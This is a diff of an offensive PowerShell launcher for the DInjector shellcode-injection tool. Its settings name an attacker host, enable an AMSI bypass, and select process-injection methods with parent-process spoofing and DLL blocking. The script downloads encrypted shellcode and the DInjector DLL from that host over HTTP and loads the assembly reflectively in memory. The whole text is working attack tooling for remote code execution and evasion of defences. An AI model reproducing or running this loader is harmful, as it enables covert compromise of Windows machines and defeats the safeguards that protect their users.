@@ -1,11 +1,11 @@
 # MODULE
-$M = "currentthread"
+$M = "remotethreadapc"
 
 # LHOST
 $H = "10.10.13.37"
 
 # AMSI
-$A = "true"
+$A = "True"
 
 # DLL
 $D = "DInjector.dll"
@@ -14,22 +14,38 @@ $D = "DInjector.dll"
 $S = "enc"
 
 # PASSWORD
-$P = "Passw0rd!"
-
-# PROCESS
-$N = "notepad"
+$W = "Passw0rd!"
 
 # IMAGE
 $I = "C:\Windows\System32\svchost.exe"
+
+# PROCESS
+$P = "notepad"
+
+# PARENT PROCESS
+$PP = "explorer"
+
+# BLOCK DLLS
+$BD = "True"
 
 # --------------------------------------------------------------------
 
 $methods = @("remotethread", "remotethreadsuspended")
 if ($methods.Contains($M)) {
-    $N = (Start-Process -WindowStyle Hidden -PassThru $N).Id
+    $P = (Start-Process -WindowStyle Hidden -PassThru $P).Id
 }
 
-$cmd = "$M /am51:$A /sc:http://$H/$S /password:$P /pid:$N /image:$I"
+$methods = @("remotethreadapc", "remotethreadcontext", "processhollow")
+if ($methods.Contains($M)) {
+    try {
+        $PP = (Get-Process $PP -ErrorAction Stop).Id
+    }
+    catch {
+        $PP = 0
+    }
+}
+
+$cmd = "$M /am51:$A /sc:http://$H/$S /password:$W /image:$I /pid:$P /ppid:$PP /blockDlls:$BD"
 
 $data = (IWR -UseBasicParsing "http://$H/$D").Content
 $assem = [System.Reflection.Assembly]::Load($data)
